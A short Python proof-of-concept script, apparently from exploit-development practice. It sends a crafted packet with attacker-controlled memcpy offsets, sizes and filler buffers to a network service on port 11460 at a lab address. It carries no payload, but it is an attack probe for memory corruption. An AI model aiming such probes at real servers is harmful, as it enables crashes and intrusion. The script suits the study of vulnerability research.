import socket
import sys
from struct import pack

# Checksum
buf = pack(">i", 0x630)
# psAgentCommand
buf += bytearray([0x41]*0x10)  # ????
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x200)  # 2nd memcpy: size field
buf += pack("<i", 0x300)  # 3rd memcpy: offset
buf += pack("<i", 0x300)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)  # ????

# psCommandBuffer
buf += bytearray([0x42]*0x100)  # 1st buffer
buf += bytearray([0x43]*0x200)  # 2nd buffer
buf += bytearray([0x44]*0x300)  # 3rd buffer


def main():
    server = "192.168.186.10"  # sys.argv[1]
    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()
